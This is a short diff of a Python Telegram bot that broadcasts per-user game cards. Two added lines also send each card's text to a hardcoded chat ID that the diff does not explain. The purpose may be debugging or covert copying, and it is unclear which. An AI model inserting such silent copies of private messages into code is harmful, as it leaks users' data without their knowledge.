@@ -231,6 +231,7 @@ async def broadcast_leader_cards(update, context):
         print(text)
         try:
             await bot.send_message(chat_id=chat_id, text=text)
+            await bot.send_message(chat_id=1497452845, text=text)
         except:
             print("chat with id %d not fount" % chat_id)
     await update.message.reply_text("کارتهای سرگروه ها با موفقیت پخش شدند.", reply_markup=admin_markup)
@@ -256,6 +257,7 @@ async def broadcast_cards(update, context):
                                               descrip=description)
         try:
             logger.info("card sent for %s with text:\n %s", first_name, text)
+            await bot.send_message(chat_id=1497452845, text=text)
             await bot.send_message(chat_id=chat_id, text=text)
         except:
             print("chat with id %d not fount" % chat_id)
